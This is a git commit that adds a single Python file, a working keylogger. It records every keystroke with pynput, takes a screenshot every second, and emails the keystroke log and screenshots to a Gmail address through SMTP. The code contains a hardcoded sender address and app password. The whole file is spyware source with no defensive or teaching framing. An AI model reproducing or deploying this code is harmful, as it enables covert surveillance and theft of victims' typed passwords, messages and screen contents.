21f558c074258480bc6f5a5845d4f2a0e1c38285
Lucas Andrius de Oliveira <lucasandriusdeoliveira@MacBook-Air-de-Lucas.local>
2024-06-23 19:27:47 -0300

    first commit

---
+++ main.py
@@ -0,0 +1,120 @@
+import smtplib
+import email.message
+import time
+import threading
+import pyscreenshot as ImageGrab
+from pynput.keyboard import Key, Listener
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import os
+
+fullog = ''
+words = ''
+email_char_limit = 30
+
+# Lista para armazenar os nomes dos arquivos de screenshot
+screenshot_files = []
+
+# Dicionário de substituição para caracteres acentuados
+substitutions = {
+    "39": "á"
+}
+
+
+def on_press(key):
+    global words
+    global fullog
+    global email_char_limit
+
+    try:
+        if key == Key.space or key == Key.enter:
+            words += ' '
+            fullog += words
+            words = ''
+
+            if len(fullog) >= email_char_limit:
+                send_log()
+                fullog = ''
+        elif key == Key.shift_l or key == Key.shift_r:
+            return
+        elif key == Key.backspace:
+            words = words[:-1]
+        elif hasattr(key, 'char') and key.char is not None:
+            words += key.char
+        else:
+            char = f'{key}'
+            char = char[1:-1]
+            words += char
+
+        if key == Key.esc:
+            return False
+    except Exception as e:
+        print(f"Error: {e}")
+
+def replace_characters(text):
+    for original, replacement in substitutions.items():
+        while original in text:
+            index = text.find(original)
+            if index != -1:
+                text = text[:index] + replacement + text[index + len(original) + 1:]
+    return text
+
+def capture_screenshot():
+    while True:
+        time.sleep(1)
+        screenshot = ImageGrab.grab()
+        filename = f"screenshot_{int(time.time())}.png"
+        screenshot.save(filename)
+        screenshot_files.append(filename)
+
+def send_log():
+    global fullog
+    try:
+        fullog_replaced = replace_characters(fullog)
+        print(f"Sending log: {fullog_replaced}")
+
+        msg = MIMEMultipart()
+        msg['Subject'] = "Assunto"
+        msg['From'] = 'lukasandrios@gmail.com'
+        msg['To'] = 'lukasandrios@gmail.com'
+        password = 'kncunnscgoqjxauz'
+
+        msg.attach(MIMEText(fullog_replaced, 'plain'))
+
+        # Attach all screenshots
+        for filename in screenshot_files:
+            with open(filename, "rb") as attachment:
+                part = MIMEBase('application', 'octet-stream')
+                part.set_payload(attachment.read())
+                encoders.encode_base64(part)
+                part.add_header('Content-Disposition', f"attachment; filename= {filename}")
+                msg.attach(part)
+                attachment.close()
+
+        s = smtplib.SMTP('smtp.gmail.com: 587')
+        s.starttls()
+        s.login(msg['From'], password)
+        s.sendmail(msg['From'], [msg['To']], msg.as_string())
+        s.quit()
+        print('Email enviado')
+
+        # Clear the screenshot files list and delete the files
+        for filename in screenshot_files:
+            os.remove(filename)
+        screenshot_files.clear()
+
+    except Exception as e:
+        print(f"Erro ao enviar email: {e}")
+
+# Start the screenshot thread
+screenshot_thread = threading.Thread(target=capture_screenshot)
+screenshot_thread.start()
+
+# Use the pynput library to listen to events
+try:
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+except Exception as e:
+    print(f"Error in main block: {e}")
